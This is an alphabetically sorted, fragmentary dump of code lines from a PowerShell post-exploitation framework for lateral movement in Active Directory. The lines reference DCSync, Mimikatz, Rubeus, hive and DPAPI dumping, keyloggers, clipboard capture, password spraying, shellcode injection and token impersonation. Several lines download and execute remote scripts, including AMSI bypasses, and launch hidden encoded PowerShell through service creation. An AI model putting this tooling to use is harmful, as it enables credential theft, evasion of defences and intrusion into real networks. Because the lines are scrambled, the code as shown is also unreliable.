InteractWithPipeSession -PipeClient $pipeClient -StreamWriter $sw -StreamReader $sr -computerNameOnly $Target -PipeName $PipeName -TargetServer $Target -serviceToDelete $ServiceName -Admin
InteractWithPipeSession -PipeClient $selectedMultiSession.PipeClient -StreamWriter $selectedMultiSession.StreamWriter -StreamReader $selectedMultiSession.StreamReader -computerNameOnly $selectedMultiSession.ComputerName -PipeName $selectedMultiSession.PipeName -UniquePipeID $selectedMultiSession.UniquePipeID
InteractWithPipeSession -PipeClient $selectedMultiSession.PipeClient -StreamWriter $selectedMultiSession.StreamWriter -StreamReader $selectedMultiSession.StreamReader -computerNameOnly $selectedMultiSession.ComputerName -PipeName $selectedMultiSession.PipeName -UniquePipeID $selectedMultiSession.UniquePipeID -ExecuteExitCommand > $null
InteractWithPipeSession -PipeServer $pipeServer -StreamWriter $sw -StreamReader $sr -computerNameOnly $computerNameOnly -PipeName $PipeName -TargetServer $Target -serviceToDelete $ServiceName -Admin
InteractWithPipeSession -PipeServer $selectedSession.PipeServer -StreamWriter $selectedSession.StreamWriter -StreamReader $selectedSession.StreamReader -computerNameOnly $selectedSession.ComputerName -PipeName $selectedSession.PipeName
InteractWithPipeSession -PipeServer $selectedSession.PipeServer -StreamWriter $selectedSession.StreamWriter -StreamReader $selectedSession.StreamReader -computerNameOnly $selectedSession.ComputerName -PipeName $selectedSession.PipeName -ExecuteExitCommand > $null
Invoke-Command -ComputerName 
Invoke-SMBRemoting Author: Rob LP (@L3o4j)
Invoke-WMIRemoting -ComputerName $Computer -Command $Command
Invoke-WMIRemoting Author: Rob LP (@L3o4j)
Invoke-WebRequest -Uri $url -OutFile $destinationPath
KeyLog -logfile 
LocalAdminAccess.txt -Force
Message  = $error[0].ToString()
Microsoft
New-Item 'tmpfile' -EA 0 > 
New-Item -ItemType Directory -Force -Path $destinationFolder
Out-File -InputObject $serverOutput -FilePath $fileName
Out-String
Output       = $output
PInject /t:1 /f:hex /pid:$InjectPID /sc:
PS1ToEXE -content $exescript -outputFile $exefilelocation
PSReadLine
Payloads
Pipe = $powershell
Pipe = $runspace
Post-Exploitation framework designed to assist with lateral movement within Active Directory environments
PowerShell
PowerShell = $Job
Print-MultiListener
Print-MultiListener -NoWait
PrintHelpImpersonation
PrintHelpLocalAdminAccess
PrintHelpRemoting
PrintHelpSessionHunter
Public
RDPLog.exe'
RDPLog.exe' -PassThru
RDP_log.txt 
ROOT
Remove-Variable -Name FileServerProcess -Scope Global -ErrorAction SilentlyContinue
Roaming
SOFTWARE
SecurityCenter2 Path AntiVirusProduct
Select-Object -Property IPAddress -ExpandProperty IPAddress
Set-Variable MaximumHistoryCount 32767
ShellGen -ShCommand $shellcommand
Start-Listener
Start-Process sc.exe -ArgumentList 
Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
Start-Process sc.exe -ArgumentList $startarguments -WindowStyle Hidden
Start-Process sc.exe -ArgumentList $stoparguments -WindowStyle Hidden
Start-Sleep -Milliseconds 100
Start-Sleep -Milliseconds 1000
Start-Sleep -Milliseconds 50
Start-Sleep -Milliseconds 500
Start-Sleep -Seconds $timeInterval
Start-Sleep -Seconds 1
Start-Sleep -Seconds 5 
Start-Sleep 1
Status   = $powerShellInstance.BeginInvoke()
Status = $powershell.BeginInvoke()
Status = $runspace.BeginInvoke()
Stop-Process -Id 
Stop-Process -Id $global:FileServerProcess.Id -ErrorAction SilentlyContinue
Stop-Process -Id $processId
Success  = $false
Success  = $true
System32
TGT_Monitor -EncryptionKey 
TGT_Monitor -Timeout 86400 -EncryptionKey 
URL: https://github.com/Leo4j/Amnesiac
UpdateBookmark $listener.PipeName ($index)
UpdateBookmark $multilistener.UniquePipeID ($index)
Users
Where-Object { $_.InterfaceAlias -notlike 'Loopback
Windows
Windows Defender
Write-Output $Banner
Write-Output $BannerLink
Write-Output $ClipboardContent.Trim()
Write-Output $KeylogContent.Trim()
Write-Output $LineComputerAccess}
Write-Output $bookmark.DisplayName
Write-Output $finalResult
Write-Output $line
Write-Output $output
Write-Output $serverOutput.Trim()
Write-Output $test
Write-Output '    Rubeus createnetonly /program:c:
Write-Output '    ShellGen powershell.exe -ep bypass -WindowS Hidden -enc JABzAGQA.....wBlACgAKQA='
Write-Output '    msfvenom -p windows/x64/exec CMD=
Write-Output ''
Write-Output '[
[Console]::Write($promptString)
[PSCustomObject]@{
[Parameter(Mandatory = $false)]
[Parameter(Mandatory = $true)]
[Parameter(Mandatory=$true)]
[string]$Command
[string]$DomainController
[string]$Password
[string]$Timeout
[string]$outputFile
[switch]$HidePayload
[switch]$InLine
[switch]$Night
[switch]$SkipPortScan
[switch]$Verbose
[switch]$WMI
[void]$Mutex.WaitOne()
] ')[1]
] Ask4Creds Loaded 
] Domain Password Spray 
] DpapiDump Loaded 
] Find-LocalAdminAccess Loaded 
] HiveDump Loaded 
] Invoke-DCSync Loaded 
] Invoke-GrabTheHash Loaded 
] Invoke-SessionHunter Loaded 
] Mimi Loaded 
] New Global-Listener PipeName: $global:MultiPipeName 
] New session established [$($runspace.Computer)]
] Output saved to: $PWD
] Output saved to: c:
] PInject Loaded 
] PowerView Loaded 
] PowershellKerberos Loaded 
] RDP Keylogger Loaded 
] Rubeus Loaded 
] SMBRemoting and WMIRemoting Loaded 
] Session killed [$($selectedMultiSession.ComputerName)]
] Session killed [$($selectedSession.ComputerName)]
] Tip: How to generate your hex shell code:'
] Token-Impersonation Loaded 
] Usage: Mimi -Command ''
] Usage: PInject <pid> <shellcode_in_hex_format>'
] Usage: Rubeus <command>'
] Validate Domain Credentials 
])').Value) })
antivirus
break
break 
break}
c$ -ErrorAction SilentlyContinue}
c$ > $null
catch {
cimv2 -Class Win32_ComputerSystem 
cmd.exe /c powershell.exe -enc $B64ServerScript
cmd.exe /c powershell.exe -enc $b64ClientScript
cmd.exe /c powershell.exe -enc $b64ServerScript
continue
continue}
default {
do {
else {
else {$cimSession = New-CimSession -ComputerName $ComputerName}
elseif ($Method -eq 'SMB') {
elseif ($Method -eq 'WMI') {
elseif ($command -eq 'Ask4Creds') {
elseif ($command -eq 'Clipboard') {
elseif ($command -eq 'CredValidate') {
elseif ($command -eq 'DCSync') {
elseif ($command -eq 'GListener') {
elseif ($command -eq 'History') {
elseif ($command -eq 'Impersonation') {
elseif ($command -eq 'PassSpray') {
elseif ($command -eq 'scramble') {
elseif ($command -eq 'toggle') {
elseif ($command -like 'GLSet 
elseif ($sessionNumber -gt $directAdminEndIndex -and $sessionNumber -le $listenerEndIndex) {
elseif ($sessionNumber -gt $listenerEndIndex -and $sessionNumber -le $globalListenerEndIndex) {
elseif ($sessionNumber -gt $listenerEndIndex) {
elseif (($command -eq 'screenshot') -OR ($command -eq 'screen4K')) {
elseif($adminLines.Count -gt 0 -and $noAccessLines.Count -eq 0){
elseif($adminLines.Count -gt 0 -and $noAccessLines.Count -gt 0){
elseif($global:AdminCheckProtocol -eq 'WMI'){
elseif($global:localadminaccesspayload -eq 'PSRemoting'){
elseif($global:localadminaccesspayload -eq 'SMB'){
elseif($global:payloadformat -eq 'exe'){
elseif($global:payloadformat -eq 'gzip'){
elseif($global:payloadformat -eq 'pwraw'){
elseif($global:payloadformat -eq 'pwsh'){
elseif($global:payloadformat -eq 'raw'){
elseif($userdefdomain -AND $userdefdc){
else{
else{$ComputerAccess 
else{$Computers = $global:AllUserDefinedTargets}
else{$DefineHostname = [System.Net.Dns]::GetHostByName(($env:computerName)).HostName}
else{$FinalTargets = $global:AllUserDefinedTargets}
else{$Port = 445}
else{$PromptComputerName = $computerNameOnly -split '
else{$ReachableDomains = $ReachableDomains 
else{$SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value}
else{$ShowBookmarks = $True}
else{$ShowMenuCommands = $True}
else{$ShowSessions = $True}
else{$ShowUserDefinedTargets = $True}
else{$TempAccessVar = CheckReachableHosts}
else{$UserDefinedTargets = CheckReachableHosts}
else{$allReachTargets = CheckReachableHosts -WMI}
else{$allTargets = CheckAdminAccess}
else{$computerNameOnly = $ComputerName -split '
else{$global:Detach = $False}
else{$global:RestoreTimeout = $False}
else{$wmiData = Set-WmiInstance -Class $ClassID -ComputerName $ComputerName}
else{Choose-And-Interact -Target $selectedTarget -TimeOut $Timeout}
else{Scan-WaitingTargets}
else{continue}
exit
for ($i = $global:MultipleSessions.Count - 1
for ($i = $global:listenerSessions.Count - 1
for ($i = 0
for ($i=0
for ($j = $global:bookmarks.Count - 1
foreach ($Computer in $ComputerAccess) {
foreach ($Computer in $Computers) {
foreach ($Job in $JobObjects) {
foreach ($cmd in $predefinedCommands) {
foreach ($computer in $Computers) {
foreach ($computer in $reachable_hosts) {
foreach ($line in $global:Message) {
foreach ($run in $runspaces) {
foreach ($runspace in $runspaces) {
foreach ($target in $allTargets) {
foreach ($url in $urls) {
foreach ($userDir in $TempUsernameGrab) {
foreach($AllDomain in $AllDomains){
foreach($ChildDomain in $ChildDomains){
foreach($IP in $PossibleIPAddresses){
foreach($TrustTargetName in $TrustTargetNames){
foreach($UDT in $UserDefinedTargets){
foreach($line in $InjectOutput){
function Amnesiac {
function CheckAdminAccess {
function CheckReachableHosts {
function Choose-And-Interact {
function Command ([string] $command) {
function Detached-Interaction {
function Display-SessionMenu {
function Download-File {
function Encode-Command {
function File-Server {
function Find-LocalAdminAccess {
function FindDomainTrusts {
function Get-ADComputers {
function Get-AvailableCommands  {
function Get-Command {
function Get-FileNameFromUrl {
function InteractWithPipeSession{
function Invoke-SMBRemoting {
function Invoke-WMIRemoting {
function PS1ToEXE {
function Print-MultiListener {
function PrintHelpImpersonation{
function PrintHelpLocalAdminAccess{
function PrintHelpRemoting{
function PrintHelpSessionHunter{
function Reverse ([array] $chunks) {
function Scan-WaitingTargets{
function ShellGen {
function Start-Listener {
function WMIAdminAccess {
https://github.com/Leo4j/Find-LocalAdminAccess
https://github.com/Leo4j/Invoke-SMBRemoting
https://github.com/Leo4j/Invoke-WMIRemoting
iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Dpapi.ps1')
iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Ferrari.ps1')
iex(new-object net.webclient).downloadstring('$($global:ServerURL)/HiveDump.ps1')
iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Invoke-GrabTheHash.ps1')
iex(new-object net.webclient).downloadstring('$($global:ServerURL)/NETAMSI.ps1')
iex(new-object net.webclient).downloadstring('$($global:ServerURL)/SimpleAMSI.ps1')
iex(new-object net.webclient).downloadstring('$($global:ServerURL)/klg.ps1')
if (
if (!$global:AllOurTargets) {
if (!(Test-Path -Path $destinationPath)) {
if ($Command) {
if ($Method -eq 'PSRemoting') {
if ($Method -eq 'SMB' -AND $scsafe) {
if ($Method -eq 'SMB') {
if ($PipeClient -AND (-not $PipeClient.IsConnected)) {
if ($Result.Error) {
if ($Targets) {
if ($UserName -and $Password) {
if ($allowedCommands -contains $command) {
if ($bookmarkToRemove) {
if ($choice -eq '') {continue}
if ($choice -eq 'Bookmarks') {
if ($choice -eq 'Find-LocalAdminAccess') {
if ($choice -eq 'exit') {
if ($choice -eq 'help') {
if ($choice -eq 'kill all') {
if ($choice -eq 'scramble') {
if ($choice -eq 'sessions') {
if ($choice -eq 'switch') {
if ($choice -eq 'targets') {
if ($choice -eq 'toggle') {
if ($choice -is [int] -and $choice -ge 5 -and $choice -lt ($global:directAdminSessions.Count 
if ($cimInstance) {Remove-CimInstance -CimInstance $cimInstance}
if ($commandParts[0] -eq 'GLSet' -and $commandParts[1]) {
if ($commandParts[0] -eq 'bookmark' -and $commandParts[1] -match '
if ($commandParts[0] -eq 'kill' -and $commandParts[1] -match '
if ($commandParts[0] -eq 'targets' -and $commandParts[1] -eq 'check') {
if ($commandParts[0] -eq 'targets' -and $commandParts[1] -eq 'clear') {
if ($commandParts[0] -eq 'targets' -and $commandParts[1]) {
if ($commandParts[0] -eq 'unbookmark' -and $commandParts[1] -match '
if ($computerNameOnly -eq 'dummyhostdropconnection') {
if ($cred) {
if ($global:MultipleSessions.Count -gt 0) {
if ($global:MultipleSessions[$i].UniquePipeID -eq $selectedMultiSession.UniquePipeID) {
if ($global:bookmarks.Count -gt 0) {
if ($global:bookmarks[$i].Identifier -eq $identifierToRemove) {
if ($global:directAdminSessions.Count -gt 0) {
if ($global:listenerSessions.Count -gt 0) {
if ($global:listenerSessions[$i].PipeName -eq $selectedSession.PipeName) {
if ($handle.AsyncWaitHandle.WaitOne($timeoutSeconds 
if ($indexToRemove -ne -1) {
if ($listenerMatch -or $multiListenerMatch) {
if ($null -ne $identifierToRemove) {
if ($null -ne $indexToRemove) {
if ($pipeServer -AND (-not $pipeServer.IsConnected)) {
if ($pipeServer -and $pipeServer.IsConnected) {
if ($result) {
if ($result.Success) {
if ($sessionNumber -ge 5 -and $sessionNumber -le $directAdminEndIndex) {
if ($sr) {
if ($startProcess.ReturnValue -eq 0) {
if ($sw) {
if ($wait) {
if (-not 
if (-not $ComputerName) {
if (-not $Target) {
if (-not $classExists) {
if (-not ($global:directAdminSessions -contains $target)) {
if (-not (Test-Path $basePath)) {New-Item -Path $basePath -ItemType Directory > $null}
if (-not (Test-Path $subfolderPath)) {New-Item -Path $subfolderPath -ItemType Directory > $null}}
if (-not (Test-Path -Path $destinationFolder)) {
if (Test-Path $localFullPath) {
if(!$ComputerAccess){return}
if(!$FindCurrentDomain){$FindCurrentDomain = $env:USERDNSDOMAIN}
if(!$FindCurrentDomain){$FindCurrentDomain = Get-WmiObject -Namespace root
if(!$FindCurrentDomain){$FindCurrentDomain = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().DomainName.Trim()}
if(!$GlobalPipeName){$global:MultiPipeName = ((65..90) 
if(!$HidePayload){
if(!$NoOutput){
if(!$NoWait){Start-Sleep 4}
if(!$PipeName){
if(!$Port){$Port = 8080}
if(!$ServiceName){
if(!$ShowErrors){
if(!$SinglePipeName){
if(!$SkipPortScan){
if(!$global:AllUserDefinedTargets){
if(!$global:RestoreTimeout){$timeoutSeconds = 30}
if(!$userdefPort){$userdefPort = 8080}
if($Admin){
if($CheckTargets){
if($ChildDomains){
if($ClipboardContent){
if($ComputerAccess){
if($ComputerName -match $ipPattern){$computerNameOnly = $ComputerName}
if($Detached -AND -not $IP){
if($Detached){$DefineHostname = $global:IP}
if($Detached){$global:Detach = $True}
if($Domain -AND $DomainController){$TempAccessVar = CheckReachableHosts -Domain $Domain -DomainController $DomainController}
if($Domain -AND $DomainController){$UserDefinedTargets = CheckReachableHosts -Domain $Domain -DomainController $DomainController}
if($Domain -AND $DomainController){$allReachTargets = CheckReachableHosts -Domain $Domain -DomainController $DomainController -WMI}
if($Domain -AND $DomainController){$allTargets = CheckAdminAccess -Domain $Domain -DomainController $DomainController}
if($Domain -AND $DomainController){Scan-WaitingTargets -Domain $Domain -DomainController $DomainController}
if($ExecuteExitCommand){
if($ExitLoop -eq $True){continue}
if($IP){$global:IP = $IP}
if($InLine){$LineComputerAccess = $ComputerAccess
if($KeylogContent){
if($Method -eq 'SMBRemoting'){
if($Method -eq 'WMIRemoting'){
if($Night){
if($PipeClient){
if($PipeServer){
if($PlaceHolder){$PlaceHolder = $False
if($ReachableResult){}
if($SaveOutput){
if($ScanMode -OR $global:ScanModer){$ScanMode = $False
if($ScanMode -OR $global:ScanModer){$choice = 3}
if($ShowBookmarks){
if($ShowBookmarks){$ShowBookmarks = $False}
if($ShowMenuCommands){
if($ShowMenuCommands){$ShowMenuCommands = $False}
if($ShowSessions){
if($ShowSessions){$ShowSessions = $False}
if($ShowUserDefinedTargets){
if($ShowUserDefinedTargets){$ShowUserDefinedTargets = $False}
if($Targets){
if($TempAdminAccessTargets){
if($TestPath){
if($UserDefinedTargets){
if($UserName -AND $Password) {
if($UserName -AND $Password){
if($UserName){
if($Verbose){
if($WMI){$Port = 135}
if($adminLines.Count -eq 0){
if($allTargets){
if($computerNameOnly -match $ipPattern){$PromptComputerName = $computerNameOnly}
if($cred){
if($cred){$wmiData = Set-WmiInstance -Class $ClassID -ComputerName $ComputerName -Credential $cred}
if($error[0] -eq $null) {
if($filtered){
if($global:AdminCheckProtocol -eq 'SMB'){
if($global:Detach){
if($global:Detach){$SID = 'S-1-1-0'}
if($global:Detach){Detached-Interaction -Target $selectedTarget -TimeOut $Timeout}
if($global:FileServerProcess){
if($global:Message){
if($global:RestoreAllUserDefinedTargets -eq $True){$global:AllUserDefinedTargets = $global:OldTargetsToRestore
if($global:RestoreOldMultiPipeName -eq $True){$global:MultiPipeName = $global:OldPipeNameToRestore
if($global:bookmarks){
if($global:localadminaccesspayload -eq 'PSRemoting'){
if($global:localadminaccesspayload -eq 'SMB'){
if($global:payloadformat -eq 'b64'){
if($global:payloadformat -eq 'exe'){
if($scsafe){
if($userdefPath){$userdefPath = $userdefPath.TrimEnd('
if($userdefURL){
if($userdefdomain -AND -not $userdefdc){
if($userdeftargets){
if($userdefusername -AND $userdefpassword){
if(($global:directAdminSessions.Count -gt 0) -OR ($global:listenerSessions.Count -gt 0) -OR ($global:MultipleSessions.Count -gt 0)){
if(-not 
klist sessions'
n' -replace '
namespace ModuleNamespace
net sessions
not running
param (
param ($Computer)
param ($computer)
param ($sr)
param ([string]$ShCommand)
param ([string]$url)
param ([switch]$NoWait)
param(
public class SimpleFileServer
query session
return
return $computer
return $filename -replace '[
return $null
return $output
return $resultData
return @{
root
sc.exe delete $serviceToDelete
switch ($choice) {
system32
try {
try{
try{$choice = [int]$choice}
using System
using System.IO
using System.Management.Automation
using System.Net
using System.Net.Sockets
using System.Reflection
using System.Text
u{000D}
while (
while ($elapsedTime -lt $timeout) {
while ($true) {
while (Test-Path $fileName) {
while(
while($true){
windows
} catch [System.TimeoutException] {
} catch {
} catch {}
} else {
} else {$FinalTargets = $global:AllOurTargets}
} else {$PipeName = $SinglePipeName}
} else {}
} elseif ($choice -is [int] -and $choice -ge ($global:directAdminSessions.Count 
} finally {
} while ($elapsedTime -lt $timeout)
}).AddArgument($currentUrl).AddArgument($destinationFolder)
